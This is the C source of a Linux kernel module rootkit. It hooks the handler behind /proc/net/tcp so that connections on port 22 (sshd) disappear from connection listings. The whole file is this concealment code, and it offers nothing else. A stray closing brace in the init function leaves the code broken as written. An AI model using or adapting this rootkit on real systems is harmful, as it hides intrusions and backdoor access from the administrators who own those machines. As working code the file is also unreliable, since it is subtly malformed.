#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/init.h>
#include <net/tcp.h>

/*from net/ipv4/tcp_ipv4.c*/
#define TMPSZ 150

/*hide sshd*/
#define PORT_TO_HIDE 22

MODULE_LICENSE("GPL");

int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;

char *strnstr(const char *haystack, const char *needle, size_t n)
{
	char *s = strstr(haystack, needle);
	if (s == NULL)
		return NULL;
        if (s-haystack+strlen(needle) <= n)
                return s;
        else
                return NULL;
}

int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
{
        int retval=old_tcp4_seq_show(seq, v);

        char port[12];

        sprintf(port,"%04X",PORT_TO_HIDE);

        if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
	        seq->count -= TMPSZ;
	return retval;   
}

static int __init myinit(void)
{
        struct tcp_seq_afinfo *my_afinfo = NULL;
        struct proc_dir_entry *my_dir_entry = proc_net->subdir;

        while (strcmp(my_dir_entry->name, "tcp"))
                my_dir_entry = my_dir_entry->next;

        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data)){
                old_tcp4_seq_show = my_afinfo->seq_show;
                my_afinfo->seq_show = hacked_tcp4_seq_show;
	}											        }
				                        
        return 0;
}
        
static void myexit(void)
{
        struct tcp_seq_afinfo *my_afinfo = NULL;
        struct proc_dir_entry *my_dir_entry = proc_net->subdir;
			 
        while (strcmp(my_dir_entry->name, "tcp"))
                my_dir_entry = my_dir_entry->next;
				        
        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data)) {
	        my_afinfo->seq_show=old_tcp4_seq_show;
        }					                
}
                      
module_init(myinit);
module_exit(myexit);
